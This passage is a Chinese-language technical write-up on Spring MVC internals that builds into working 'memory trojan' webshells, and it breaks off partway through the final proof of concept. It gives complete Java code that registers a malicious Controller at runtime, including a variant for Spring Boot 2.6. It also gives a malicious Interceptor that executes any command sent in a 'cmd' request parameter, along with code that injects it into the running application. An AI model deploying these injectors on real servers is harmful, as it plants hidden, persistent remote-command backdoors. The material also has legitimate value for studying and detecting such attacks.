IoC 容器；而 ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器。\n\n如果要访问和操作 bean ，一般要获得当前代码执行环境的IoC 容器 代表者 ApplicationContext。\n\n- Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context\n- 所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean\n- 所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中\n#### ContextLoaderListener\nContextLoaderListener主要用来初始化全局唯一的Root Context，即Root WebApplicationContext，它会和其他Child Context实例共享自己的IoC容器，以便Child Context获取并使用容器里的bean。\n\n\n### Spring MVC\n##### Spring MVC的运行流程\n<img src=\"/img/3-12/2.png\" >         \n客户端发送Request，DispatcherServlet(等同于Controller控制器)，控制器接收到请求，来到HandlerMapping（在配置文件中配置），HandlerMapping会对URL进行解析，并判断当前URL该交给哪个Controller来处理，找到对应的Controller之后，Controller就跟Server、JavaBean进行交互，得到某一个值，并返回一个视图（ModelAndView过程），Dispathcher通过ViewResolver视图解析器,找到ModelAndView对象指定的视图对象,最后，视图对象负责渲染返回给客户端。\n<img src=\"/img/3-12/3.png\" >\n\n配置springmvc\n```xml\n <context-param>\n        <param-name>contextConfigLocation</param-name>\n        <param-value>/WEB-INF/applicationContext.xml</param-value>\n    </context-param>\n<servlet>\n    <servlet-name>dispatcherServlet</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n<init-param>\n    <param-name>contextConfigLocation</param-name>\n    <param-value>classpath:springmvc.xml</param-value>\n</init-param>\n</servlet>\n<servlet-mapping>\n    <servlet-name>dispatcherServlet</servlet-name>\n    <url-pattern>/</url-pattern>\n</servlet-mapping>\n\n<!--添加Spring内置的过滤器，解决乱码问题-->\n<filter>\n    <filter-name>encodingFilter</filter-name>\n    <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>\n    <init-param>\n        <param-name>encoding</param-name>\n        <param-value>UTF-8</param-value>\n    </init-param>\n</filter>\n<filter-mapping>\n    <filter-name>encodingFilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n```\n看下其中的<context-param>与<listener>，当没有显式配置 ContextLoaderListener的contextConfigLocation时，程序会自动寻找/WEB-INF/applicationContext.xml作为配置文件\n#### DispatcherServlet\n它的主要作用是处理传入的web请求，根据配置的URL，将请求分发给正确的 Controller和View。DispatcherServlet初始化完成后，会创建一个普通的Child Context实例。对于DispatcherServlet，实际上它本质就是一个Servlet，现在来回看web.xml中的这一段\n```xml\n<servlet>\n    <servlet-name>dispatcherServlet</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    <init-param>\n        <param-name>contextConfigLocation</param-name>\n        <param-value>/WEB-INF/dispatcherServlet-servlet.xml</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n</servlet>\n```\n\n### Tomcat使用Spring、SpringMVC\nTomcat无法启动，或者是启动后404,没有加载上springmvc的DispatcherServlet\n踩坑：[https://blog.csdn.net/qq_50231389/article/details/118015734](https://blog.csdn.net/qq_50231389/article/details/118015734)\n其实不是上面说的那回事，使用了spring 6版本，把版本改低就ok了\n\nweb.xml\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n    <servlet>\n        <servlet-name>dispatcherServlet</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            <param-value>classpath:spring-mvc.xml</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>dispatcherServlet</servlet-name>\n        <url-pattern>/</url-pattern>\n    </servlet-mapping>\n</web-app>\n```\n这里对应spring-mvc.xml\n```xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:mvc=\"http://www.springframework.org/schema/mvc\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n        http://www.springframework.org/schema/beans/spring-beans.xsd\n        http://www.springframework.org/schema/mvc\n        http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\">\n\n    <mvc:annotation-driven/>\n    <!-- 1.使用注解，扫描项目中的包 -->\n    <context:component-scan base-package=\"com.yyjccc.memorytrojan.Spring.controller\"></context:component-scan>\n    <!-- 2.开启注解 -->\n    <mvc:annotation-driven/>\n\n</beans>\n```\n\n\n## Controller型\n和Tomcat内存马类似，我们就需要了解如何动态的注册Controller，思路如下\n\n1. 获取上下文环境\n2. 注册恶意Controller\n3. 配置路径映射\n\n### 获取Context\n有四种方法\n\n- getCurrentWebApplicationContext\n```java\nWebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();\n```\ngetCurrentWebApplicationContext 获得的是一个 XmlWebApplicationContext 实例类型的 Root WebApplicationContext。\n\n- WebApplicationContextUtils\n```java\nWebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());\n```\n或者是\n```java\nWebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());\n```\n根据RequestContextHolder.currentRequestAttributes()).getRequest()拿到当前请求并获取ServletContext\n再拿到ApplicationContext\n<img src=\"/img/3-12/4.png\" >\n\n- RequestContextUtils\n```java\nWebApplicationContext webApplicationContext = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());\n```\n通过 ServletRequest 类的实例来获得 Child WebApplicationContext。\n\n- getAttribute\n```java\nWebApplicationContext context3 = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n```\n\n### 动态注册Controller\nSpring Controller 的动态注册，就是对 RequestMappingHandlerMapping 注入的过程。\n调试一下：\n断点打到我们的Controller类中方法内，\n查看函数调用栈，看看是怎么调到此方法的\n<img src=\"/img/3-12/5.png\" >\n从doGet逐层往下看\n<img src=\"/img/3-12/6.png\" >\n到AbstractHandlerMethodAdapter#handle方法，\n之前都只是request,和response参数一直往下传，现在发现多了一个handler\n<img src=\"/img/3-12/7.png\" >\n发现handler中已经有封装好了目标方法，即我们写的处理业务的方法\n<img src=\"/img/3-12/8.png\" >\n那之后反射调用即可。\n看看handler怎么来的\ndoDispatch方法中\n<img src=\"/img/3-12/9.png\" >\nDispatcherServlet#getHandler方法中\n<img src=\"/img/3-12/10.png\" >\n<img src=\"/img/3-12/11.png\" >\n第一个就是RequestMappingHandlerMapping，for循环遍历拿到它，并根据request拿取HandlerChain。\n思路清晰了就是从RequestMappingHandlerMapping中根据URL拿到要调用方法\n攻击思路就是往里面注入新的映射，从而调用我们的恶意方法\n\nRequestMappingHandlerMapping是springMVC里面的核心Bean，spring把我们的controller解析成RequestMappingInfo对象，然后再注册进RequestMappingHandlerMapping中，这样请求进来以后就可以根据请求地址调用到Controller类里面了\n\n- RequestMappingHandlerMapping对象本身是spring来管理的，可以通过ApplicationContext取到，所以并不需要我们新建。\n- 在SpringMVC框架下，会有两个ApplicationContext，一个是Spring IOC的上下文，这个是在java web框架的Listener里面配置，就是我们经常用的web.xml里面的org.springframework.web.context.ContextLoaderListener，由它来完成IOC容器的初始化和bean对象的注入。\n- 另外一个是ApplicationContext是由org.springframework.web.servlet.DispatcherServlet完成的，具体是在org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()这个方法做的。而这个过程里面会完成RequestMappingHandlerMapping这个对象的初始化。\n\nSpring 3.1 开始及以后一般开始使用新的\norg.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\n映射器来支持@Contoller和@RequestMapping注解。\n\n\n拿request去匹配已经注册好的RequestMappingInfo，即用URL路径匹配Contorller\n再根据RequestMappingInfo对象从map中拿到handler\n\n上面调式继续下去\n走到RequestMappingHandlerMapping的父类AbstractHandlerMethodMapping#getHandlerInternal\n<img src=\"/img/3-12/12.png\" >\n这里还对this.mappingRegistry加了读锁（： \n那应该就是操作这个属性\n后面发现最后是mappingRegistry的register属性中拿到的\n<img src=\"/img/3-12/13.png\" >\n<img src=\"/img/3-12/14.png\" >\n这下就是找注入的方法（直接抄现成的了）\n\n#### registerMapping\n在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping\n步骤：\n\n- 获取context\n- 获取RequestMappingHandlerMapping\n- 反射拿到要调用的方法\n- 创建RequestMappingInfo，对应着一个Controller\n- 注册进入RequestMappingHandlerMapping\n```java\n// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean\nRequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);\n// 2. 通过反射获得自定义 controller 中唯一的 Method 对象\nMethod method = (Class.forName(\"me.landgrey.SSOLogin\").getDeclaredMethods())[0];\n// 3. 定义访问 controller 的 URL 地址\nPatternsRequestCondition url = new PatternsRequestCondition(\"/hahaha\");\n// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）\nRequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();\n// 5. 在内存中动态注册 controller\nRequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);\nr.registerMapping(info, Class.forName(\"恶意Controller\").newInstance(), method);\n```\n\nSpring 2.5 开始到 Spring 3.1 之前一般使用\norg.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping映射器 ；\n#### registerHandler\n(版本古老，暂且就不复现了（：）\n参考上面的 HandlerMapping 接口继承关系图，针对使用 DefaultAnnotationHandlerMapping 映射器的应用，可以找到它继承的顶层类org.springframework.web.servlet.handler.AbstractUrlHandlerMapping\n在其registerHandler()方法中\n<img src=\"/img/3-12/15.png\" >\n该方法接受 urlPath参数和 handler参数，可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 将 url 和 controller 实例 bean 注册到 handlerMap 中\n```java\n// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean\ncontext.getBeanFactory().registerSingleton(\"dynamicController\", Class.forName(\"me.landgrey.SSOLogin\").newInstance());\n// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean\norg.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);\n// 3. 反射获得 registerHandler Method\njava.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(\"registerHandler\", String.class, Object.class);\nm1.setAccessible(true);\n// 4. 将 dynamicController 和 URL 注册到 handlerMap 中\nm1.invoke(dh, \"/favicon\", \"dynamicController\");\n```\n#### detectHandlerMethods\n参考上面的 HandlerMapping 接口继承关系图，针对使用 RequestMappingHandlerMapping 映射器的应用，可以找到它继承的顶层类org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\n在其detectHandlerMethods() 方法中\n```java\nprotected void detectHandlerMethods(Object handler) {\n    Class<?> handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass();\n    final Class<?> userType = ClassUtils.getUserClass(handlerType);\n    Set<Method> methods = HandlerMethodSelector.selectMethods(userType, new MethodFilter() {\n        public boolean matches(Method method) {\n            return AbstractHandlerMethodMapping.this.getMappingForMethod(method, userType) != null;\n        }\n    });\n    Iterator var6 = methods.iterator();\n    while(var6.hasNext()) {\n        Method method = (Method)var6.next();\n        T mapping = this.getMappingForMethod(method, userType);\n        this.registerHandlerMethod(handler, method, mapping);\n    }\n}\n```\n该方法仅接受handler参数，同样可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 并注册 controller 的实例 bean\n```java\ncontext.getBeanFactory().registerSingleton(\"dynamicController\", Class.forName(\"恶意Controller\").newInstance());\norg.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);\njava.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(\"detectHandlerMethods\", Object.class);\nm1.setAccessible(true);\nm1.invoke(requestMappingHandlerMapping, \"dynamicController\");\n```\n\n\n### 完整Poc\n#### spring+Tomcat环境\n恶意类\n```java\npackage com.yyjccc.memorytrojan.Spring.controller;\n\nimport java.io.IOException;\n\npublic class Shell_Controller{\n\n\tpublic Shell_Controller(){}\n\n\tpublic void shellMethod() throws IOException {\n\t\tRuntime.getRuntime().exec(\"calc\");\n\t}\n}\n\n```\n\n\n```java\npackage com.yyjccc.memorytrojan.Spring.controller;\n\n\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\nimport org.springframework.web.context.ContextLoader;\nimport org.springframework.web.context.WebApplicationContext;\nimport org.springframework.web.context.request.RequestContextHolder;\nimport org.springframework.web.context.request.ServletRequestAttributes;\nimport org.springframework.web.context.support.WebApplicationContextUtils;\nimport org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;\nimport org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;\nimport org.springframework.web.servlet.mvc.method.RequestMappingInfo;\nimport org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;\nimport org.springframework.web.servlet.support.RequestContextUtils;\n\nimport java.lang.reflect.Method;\nimport java.util.Objects;\n\n@RestController\npublic class MyController {\n    @RequestMapping(\"/sh\")\n\tpublic String exp() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {\n\n\t\tWebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n\t\t// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean\n\t\tRequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);\n\t\t// 2. 通过反射获得自定义 controller 中唯一的 Method 对象\n\t\tMethod method = (Shell_Controller.class.getDeclaredMethods())[0];\n\t\t// 3. 定义访问 controller 的 URL 地址\n\t\tPatternsRequestCondition url = new PatternsRequestCondition(\"/hahaha\");\n\t\t// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）\n\t\tRequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();\n\t\t// 5. 在内存中动态注册 controller\n\t\tRequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);\n\t\tr.registerMapping(info, Class.forName(\"com.yyjccc.memorytrojan.Spring.controller.Shell_Controller\").newInstance(), method);\n\t\treturn \"shell2\";\n\t}\n```\n\n#### Springboot环境\n\n\n> Spring 2.5 开始到 Spring 3.1 之前一般使用 org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping 映射器 ；\n> Spring 3.1 开始及以后一般开始使用新的 org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping 映射器来支持@Contoller和@RequestMapping注解。\n> \n\n\n**在使用 Springboot 2.6.0 版本测试时，发现注入上面内存马后无法执行。而用低于2.6.0 版本的 Springboot是可以的。**\n\n而在 Springboot 2.6.0 环境下注入Controller内存马后会报500错误，错误提示 java.lang.IllegalArgumentException: Expected lookupPath in request attribute \"org.springframework.web.util.UrlPathHelper.PATH\"，如下图：\n<img src=\"/img/3-12/16.png\" >\n原因在于从 Springboot 2.6.0 版本开始，官方修改了url路径的默认匹配策略，版本发布日志部分如下：\n\n<img src=\"/img/3-12/17.png\" >\n\n如果在 Springboot 2.6.0 的环境下，通过 application.properties配置文件设置spring.mvc.pathmatch.matching-strategy的值为ant_path_matcher，即修改服务端的路径匹配策略为 AntPathMatcher，注入的Controller内存马后访问就没问题了(不过一般也不会怎么做吧（:\n\n**看看Springboot在启动服务时是如何将代码中的Controller一一创建出来，并保存在什么地方，然后客户端访问指定url时，服务端便会去这个地方去取**。其中相关源码如下：\n<img src=\"/img/3-12/18.png\" >\n\n其中，methods是一个map对象，Method对象作为键，相应的包含访问路径等信息的RequestMappingInfo对象作为值。最后遍历methods这个map集合，对每一项进行注册，即把每一个method、访问路径及Controller保存到 AbstractHandlerMethodMapping.MappingRegistry对象中。\n\n再看一下methods里的每一项，作为key的Method对象很好理解，那作为value的RequestMappingInfo对象时如何创建的呢？还是上面的代码，它是由RequestMappingHandlerMapping#getMappingForMethod()方法创建的，该方法又调用了 RequestMappingInfo#createRequestMappingInfo(RequestMapping, RequestCondition)方法，来看一下createRequestMappingInfo(RequestMapping, RequestCondition) 方法的实现：\n<img src=\"/img/3-12/19.png\" >\n也就是说不能用原来new的方法创建RequestInfo（des），而是使用Builder创建\n\n```java\npackage com.yyjccc.webshell.Controller;\n\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\nimport org.springframework.web.context.WebApplicationContext;\nimport org.springframework.web.context.request.RequestContextHolder;\nimport org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;\nimport org.springframework.web.servlet.mvc.method.RequestMappingInfo;\nimport org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\n@RestController\npublic class BootShellController {\n\t/**\n\t * 适用于 SpringMVC+Tomcat的环境，以及Springboot 2.x 环境.\n\t */\n\t\t@RequestMapping(\"/boot\")\n\t\tpublic String SpringControllerMemShell2() throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException {\n\t\t\tWebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n\t\t\tRequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);\n\t\t\tField configField = mappingHandlerMapping.getClass().getDeclaredField(\"config\");\n\t\t\tconfigField.setAccessible(true);\n\t\t\tRequestMappingInfo.BuilderConfiguration config =\n\t\t\t\t\t(RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);\n\t\t\tMethod method2 = Shell_Controller.class.getDeclaredMethod(\"shellMethod\");\n\t\t\tRequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();\n\t\t\tRequestMappingInfo info = RequestMappingInfo.paths(\"/bash\")\n\t\t\t\t\t.options(config)\n\t\t\t\t\t.build();\n\t\t\tShell_Controller shellController = new Shell_Controller();\n\t\t\tmappingHandlerMapping.registerMapping(info,shellController , method2);\n\t\t\treturn \"bash\";\n\t\t}\n}\n```\n## Interceptor型                                                                                  \nSpring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。\n在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。\n\n- 通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义\n- 通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义\n### Interceptor使用\n这里我们选择继承HandlerInterceptor接口来实现一个Interceptor。HandlerInterceptor接口有三个方法，如下\n\n- preHandle：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。\n- postHandle：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。\n- afterCompletion：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。\n```java\npackage com.shell.interceptor;\n\nimport org.springframework.web.servlet.HandlerInterceptor;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.PrintWriter;\n\npublic class Spring_Interceptor implements HandlerInterceptor {\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        String url = request.getRequestURI();\n        PrintWriter writer = response.getWriter();\n        //如果请求路径为/login则放行\n        if ( url.indexOf(\"/login\") >= 0){\n            writer.write(\"LoginIn\");\n            writer.flush();\n            writer.close();\n            return true;\n        }\n        writer.write(\"LoginInFirst\");\n        writer.flush();\n        writer.close();\n        return false;\n    }\n}\n```\n在springmvc.xml配置文件中配置相应的Interceptor\n```java\n...\n<mvc:interceptors>\n<mvc:interceptor>\n<mvc:mapping path=\"/*\"/>\n<bean class=\"com.shell.interceptor.Spring_Interceptor\"/>\n</mvc:interceptor>\n</mvc:interceptors>\n...\n```\n编写对应的Controller\n```java\npackage com.shell.controller;\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.ResponseBody;\n\n@Controller\npublic class Spring_Controller {\n\n    @ResponseBody\n    @RequestMapping(\"/login\")\n    public String Login(){\n        return \"Success!\";\n    }\n}\n```\n访问对应路径\n<img src=\"/img/3-12/20.png\" >\n### request调用流程\n我们首先来探究一下，当一个Request发送到Spring应用时，是如何一步步到达业务逻辑处理层Controller的。\n在ApplicationFilterChain#internalDoFilter处下一个断点，可以看到此时的调用栈是和启动Tomcat时相同的\n<img src=\"/img/3-12/21.png\" >\n但与Tomcat不同的是，当调用到HttpServlet#service时，最终会调用DispatcherServlet#doDispatch进行逻辑处理，这正是Spring的逻辑处理核心类。\n<img src=\"/img/3-12/22.png\" >\n```\ndoDispatch:1028, DispatcherServlet (org.springframework.web.servlet)\ndoService:963, DispatcherServlet (org.springframework.web.servlet)\nprocessRequest:1006, FrameworkServlet (org.springframework.web.servlet)\ndoGet:898, FrameworkServlet (org.springframework.web.servlet)\nservice:655, HttpServlet (javax.servlet.http)\nservice:883, FrameworkServlet (org.springframework.web.servlet)\nservice:764, HttpServlet (javax.servlet.http)\ninternalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)\ndoFilter:162, ApplicationFilterChain (org.apache.catalina.core)\n \n...\n```\n跟进到getHandler方法\n```\nprotected HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {\n        if (this.handlerMappings != null) {\n            for (HandlerMapping mapping : this.handlerMappings) {\n                HandlerExecutionChain handler = mapping.getHandler(request);\n                if (handler != null) {\n                    return handler;\n                }\n            }\n        }\n        return null;\n    }\n```\n在 getHandler 方法中，会通过遍历 this.handlerMappings 来获取 HandlerMapping 对象实例 mapping\n<img src=\"/img/3-12/23.png\" >\n而getHandler实际上会调用org.springframework.web.servlet.handler.AbstractHandlerMapping 类的 getHandler 方法，并通过 getHandlerExecutionChain(handler, request) 方法返回 HandlerExecutionChain 类的实例\n<img src=\"/img/3-12/24.png\" >\n跟进AbstractHandlerMapping#getHandlerExecutionChain\n```\nprotected HandlerExecutionChain getHandlerExecutionChain(Object handler, HttpServletRequest request) {\n\t\tHandlerExecutionChain chain = (handler instanceof HandlerExecutionChain ?\n\t\t\t\t(HandlerExecutionChain) handler : new HandlerExecutionChain(handler));\n \n\t\tfor (HandlerInterceptor interceptor : this.adaptedInterceptors) {\n\t\t\tif (interceptor instanceof MappedInterceptor) {\n\t\t\t\tMappedInterceptor mappedInterceptor = (MappedInterceptor) interceptor;\n\t\t\t\tif (mappedInterceptor.matches(request)) {\n\t\t\t\t\tchain.addInterceptor(mappedInterceptor.getInterceptor());\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tchain.addInterceptor(interceptor);\n\t\t\t}\n\t\t}\n\t\treturn chain;\n\t}\n```\n可以看到其通过adaptedInterceptors获取所有Interceptor后进行遍历，其中可以看见一个我们自己定义的Interceptor\n<img src=\"/img/3-12/25.png\" >\n然后通过chain.addInterceptor()将所有Interceptor添加到HandlerExecutionChain中。最后返回到DispatcherServlet#doDispatch()中，调用mappedHandler.applyPreHandle方法\n<img src=\"/img/3-12/26.png\" >\n```java\nboolean applyPreHandle(HttpServletRequest request, HttpServletResponse response) throws Exception {\n    for (int i = 0; i < this.interceptorList.size(); i++) {\n        HandlerInterceptor interceptor = this.interceptorList.get(i);\n        if (!interceptor.preHandle(request, response, this.handler)) {\n            triggerAfterCompletion(request, response, null);\n            return false;\n        }\n        this.interceptorIndex = i;\n    }\n    return true;\n}\n```\n然后遍历调用Interceptor中的preHandle()拦截方法。\n因此当一个Request发送到Spring应用时，大致会经过如下几个层面才会进入Controller层\n```\nHttpRequest --> Filter --> DispactherServlet --> Interceptor --> Controller\n```\n### Interceptor型内存马实现\n通过以上分析，Interceptor实际上是可以拦截所有想到达Controller的请求的。下面的问题就是如何动态地注册一个恶意的Interceptor了。由于Interceptor和Filter有一定的相似之处，因此我们可以仿照Filter型内存马的实现思路\n\n- 获取当前运行环境的上下文\n- 实现恶意Interceptor\n- 注入恶意Interceptor\n\n**获取环境上下文**\n在Controller型内存马中，给出了四种获取Spring上下文ApplicationContext的方法。下面我们还可以通过反射获取LiveBeansView类的applicationContexts 属性来获取上下文。\n```\n// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性\njava.lang.reflect.Field filed = Class.forName(\"org.springframework.context.support.LiveBeansView\").getDeclaredField(\"applicationContexts\");\n// 2. 属性被 private 修饰，所以 setAccessible true\nfiled.setAccessible(true);\n// 3. 获取一个 ApplicationContext 实例\norg.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();\n```\norg.springframework.context.support.LiveBeansView 类在 spring-context **3.2.x** 版本（现在最新版本是 **5.3.x**）才加入其中，所以比较低版本的 spring 无法通过此方法获得 ApplicationContext 的实例。\n**获取adaptedInterceptors属性值**\n获得 ApplicationContext 实例后，还需要知道 org.springframework.web.servlet.handler.AbstractHandlerMapping 类实例的 bean name 叫什么。\n<img src=\"/img/3-12/27.png\" >\n<img src=\"/img/3-12/28.png\" >\n我们可以通过ApplicationContext上下文来获取AbstractHandlerMapping，进而反射获取adaptedInterceptors属性值\n```java\norg.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(\"requestMappingHandlerMapping\");\njava.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\nfield.setAccessible(true);\njava.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);\n```\n**实现恶意Interceptor**\n这里选择继承HandlerInterceptor类，并重写其preHandle方法\n```java\npackage com.shell.interceptor;\n\nimport org.springframework.web.servlet.HandlerInterceptor;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class Shell_Interceptor implements HandlerInterceptor {\n\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        String cmd = request.getParameter(\"cmd\");\n        if (cmd != null) {\n            try {\n                Runtime.getRuntime().exec(cmd);\n            } catch (IOException e) {\n                e.printStackTrace();\n            } catch (NullPointerException n) {\n                n.printStackTrace();\n            }\n            return true;\n        }\n        return false;\n    }\n}\n```\n**动态注册Interceptor**\n我们知道Spring是通过遍历adaptedInterceptors属性值来执行Interceptor的，因此最后我们只需要将恶意Interceptor加入到 adaptedInterceptors 属性值中就可以了。\n```java\n//将恶意Interceptor添加入adaptedInterceptors\nShell_Interceptor shell_interceptor = new Shell_Interceptor();\nadaptedInterceptors.add(shell_interceptor);\n```\n### 完整POC\n```java\npackage com.shell.controller;\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.ResponseBody;\nimport org.springframework.web.context.WebApplicationContext;\nimport org.springframework.web.context.request.RequestContextHolder;\nimport org.springframework.web.context.request.ServletRequestAttributes;\nimport org.springframework.web.servlet.HandlerInterceptor;\nimport org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;\nimport org.springframework.web.servlet.support.RequestContextUtils;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\n@Controller\npublic class Inject_Shell_Interceptor_Controller {\n\n    @ResponseBody\n    @RequestMapping(\"/inject\")\n    public void Inject() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {\n\n        //获取上下文环境\n        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());\n\n        //获取adaptedInterceptors属性值\n        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);\n        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n        field.setAccessible(true);\n        java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);\n\n\n        //将恶意Interceptor添加入adaptedInterceptors\n        Shell_Interceptor shell_interceptor = new Shell_Interceptor();\n  